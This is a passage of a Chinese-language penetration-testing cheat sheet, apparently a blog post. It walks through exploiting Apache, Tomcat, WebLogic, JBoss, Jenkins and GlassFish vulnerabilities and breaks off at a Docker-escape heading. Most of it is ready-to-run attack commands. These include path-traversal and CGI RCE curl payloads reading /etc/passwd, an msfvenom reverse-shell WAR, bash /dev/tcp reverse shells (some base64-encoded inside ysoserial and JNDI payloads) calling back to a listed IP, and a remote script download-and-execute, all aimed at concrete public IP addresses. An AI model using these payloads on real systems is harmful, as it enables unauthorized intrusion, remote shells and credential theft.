&lt;p&gt;参考地址：# &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIyMjkxNTYy&#34;&gt;https://blog.csdn.net/weixin_47306547/article/details/122291562&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具地址：https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v --path-as-is [http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6](http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6)5/.%%32%65/.%%32%65/.%%32%65/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v --data &amp;quot;echo;id&amp;quot; &amp;#x27;http://IP:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CVE-2021-41773 cve-2021-42013 的主要区别把 /%2e/换成了/.%%32%65/从而绕过了Apache HTTP Server 2.4.50 的补丁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）CVE-2017-15715&lt;/p&gt;
&lt;p&gt;apache CVE-2017-15715 文件解析：Apache HTTPD 是一款 HTTP 服务器。 其 2.4.0~2.4.29 版本存在一个解析漏洞，在解析 PHP 时，1.php\x0A 将被按照&lt;br&gt;
 PHP 后缀进行解析，导致绕过一些服务器的安全策略。&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2h0dHBkL0NWRS0yMDE3LTE1NzE1Lw==&#34;&gt;https://vulhub.org/#/environments/httpd/CVE-2017-15715/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在 1.php 后面插入一个 \x0A (注意，不能是 \x0D\x0A，只能是一个 \x0A)，不再拦截访问刚才上传的 / 1.php%0a，发现能够成功解析，但这个文件不是 php 后缀，说明目标存&lt;br&gt;
在解析漏洞&lt;/p&gt;
&lt;p&gt;（4）其他 cve&lt;/p&gt;
&lt;p&gt;此外还有 cve_2017_9798 价值不高、cve_2018_11759 价值不高等与权限无关的漏洞、cve_2021_37580 插件问题。有的 apache 和其他组件配合使用，是存在一些漏洞的，甚至可以命令执行，但是需要看当前配合的组件时哪些。&lt;/p&gt;
&lt;h4 id=&#34;tomcat弱口令-上传-包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tomcat弱口令-上传-包含&#34;&gt;#&lt;/a&gt; tomcat 弱口令 上传 包含&lt;/h4&gt;
&lt;p&gt;（1）弱口令猜解&lt;/p&gt;
&lt;p&gt;配置不当导致后台弱口令，可通过上传 jsp 压缩包改名的 war 拿 shell；tomcat 的 manager 页面存在弱口令，可用 msf 尝试爆破&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/scanner/http/tomcat_mgr_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOSTS 192.168.31.109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用 msf 生成一个反弹 shell 的 war 文件木马&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST= 192.168.31.135 LPORT= 4444 -f war -o revshell.war&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者可以利用哥斯拉生成jsp的java木马，在压缩成zip最后改名为war后缀&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/BeichenDream/Godzilla&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传到tomcat后台并且访问上传的内容即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）PUT 方法任意写文件漏洞&lt;/p&gt;
&lt;p&gt;Tomcat 版本 8.5.19 存在 PUT 方法任意写文件漏洞（CVE-2017-12615 ）。准备好木马文件 ice.jsp，利用 curl 命令用 PUT 方法往 1 .jsp/ 发送恶意木马文件，可得到 webshell。&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvdG9tY2F0L0NWRS0yMDE3&#34;&gt;https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017&lt;/span&gt; -12615/README.zh-cn.md&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -v http://110.42.178.227:8080/1.jsp/ -X PUT -d @ice.jsp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者通过 burp 改数据包，修改方法为 PUT，访问地址为 1.jsp/，并上传木马&lt;/p&gt;
&lt;p&gt;（3）文件包含漏洞&lt;/p&gt;
&lt;p&gt;Aapache Tomcat AJP 文件包含漏洞 (CVE-2020-1938) 由于 Tomcat AJP 协 议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。 此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远 程代码执行的危害。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载利用代码 (Tomcat 9.0.30)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unzip master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd CNVD-2020-10487-Tomcat-Ajp-lfi-master&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接用脚本读取敏感文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 110.42.178.227&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;weblogic-加载ldap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#weblogic-加载ldap&#34;&gt;#&lt;/a&gt; weblogic 加载 ldap&lt;/h4&gt;
&lt;p&gt;探针默认端口：7001，Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。 cve_2017_3506 工具、cve_2018_2893 工具、cve_2018_3245 工具、cve_2020_1&lt;br&gt;
4882 工具、cve_2021_2394 反序列化。&lt;br&gt;
&lt;strong&gt;安全圈小王子工具 (GUI_Tools V1.1) 一把梭&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2021-2394&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic Server 组件进行攻击，成功利用该漏洞的攻击者可以接管 WebLogic Server。 这是一个二次反序列化漏洞，是 CVE-2020-14756 和 CVE-2020-14825 的调用链相 结合组成一条新的调用链来绕过 weblogic 黑名单列表。&lt;/p&gt;
&lt;p&gt;漏洞链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzMwNjE5L2FydGljbGUvZGV0YWlscy8xMjAyNTQxMjQ=&#34;&gt;https://blog.csdn.net/m0_51330619/article/details/120254124&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在一台公网服务器上依次执行以下命令，生成ldap并监听端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意反弹shell的代码需要进行编码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.117.52.219/4444 0&amp;gt;&amp;amp;1&amp;quot; | base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41Mi4yMTkvNDQ0NCAwPiYxCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot; -A 1.117.52.219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用CVE_2021_2394攻击目标weblogic并加载远程ldap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/lz2y/CVE-2021-2394/releases/download/2.0/CVE_2021_2394_jar.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar CVE_2021_2394.jar 110.42.178.227 7001 ldap://1.117.52.219:1389/4ikzlu&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;jboss-弱口令-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jboss-弱口令-反序列化&#34;&gt;#&lt;/a&gt; jboss 弱口令 反序列化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2017-12149&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083， 8093，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。&lt;br&gt;
在一些 jboss 管理平台上，存在弱口令，可以尝试猜解密码或未授权。&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvamJvc3MvQ1ZFLTIwMTctMTIxNDk=&#34;&gt;https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;我们使用bash来反弹shell，但由于Runtime.getRuntime().&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar ysoserial.jar CommonsCollections5 &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot; &amp;gt; poc.ser&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://110.42.178.227:8080/invoker/readonly --data-binary @poc.ser&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2017-7504&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞复现过程与上差不多，唯一区别在于数据发送地址&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;jenkins-相关漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jenkins-相关漏洞&#34;&gt;#&lt;/a&gt; Jenkins 相关漏洞&lt;/h4&gt;
&lt;p&gt;探针默认端口: 8080 ，Jenkins 是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作。&lt;/p&gt;
&lt;p&gt;（1）cve_2017_1000353&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用条件未知，即便是JDK-1.8.0_291 版本也失效了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python exploit.py http://110.42.178.227:8080 jenkins_poc.ser&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）CVE-2018-1000861&lt;/p&gt;
&lt;p&gt;漏洞链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=&#34;&gt;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /tmp/1.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/1.117.52.219/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -m http.server 1389&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用脚本poc在vulhub靶场自带的启动环境中就有&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2 poc.py http://110.42.178.227:8080/ &amp;quot;curl -o /tmp/1.sh http://1.117.52.219: 1389 / 1 .txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2 poc.py http://110.42.178.227:8080/ &amp;quot;bash /tmp/1.sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）CVE_2019_100300&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=&#34;&gt;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要用户帐号密码，可以进行用户名枚举与爆破的方法测试&lt;/p&gt;
&lt;h4 id=&#34;glassfish-弱口令-信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glassfish-弱口令-信息泄露&#34;&gt;#&lt;/a&gt; glassfish 弱口令 信息泄露&lt;/h4&gt;
&lt;p&gt;探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器&lt;/p&gt;
&lt;p&gt;CVE-2017-1000028: 可以获取到后台密码以及主机上的文件内容&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;/theme/METAINF/%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读windows文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;/theme/META-INF/prototype%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c 0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读linux文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;/theme/META-INF/%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c0%ae%c0%ae/%c0%ae%c0%ae/%c0%a e%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c 0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;docker-逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-逃逸&#34;&gt;#&lt;/a&gt; docker 逃逸&lt;/h4&gt;
&lt;p&gt;Docker 容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利 用某种手段，再结合执行 POC 或 EXP，就可以返回一个宿主机的高权限 Shell， 并拿到宿主机的 root 权限。它从容器中逃了出来，因此我们形象的称为 Docker 逃逸漏洞。&lt;/p&gt;
&lt;p&gt;判断当前是在 docker 还是在宿主机上：&lt;/p&gt;
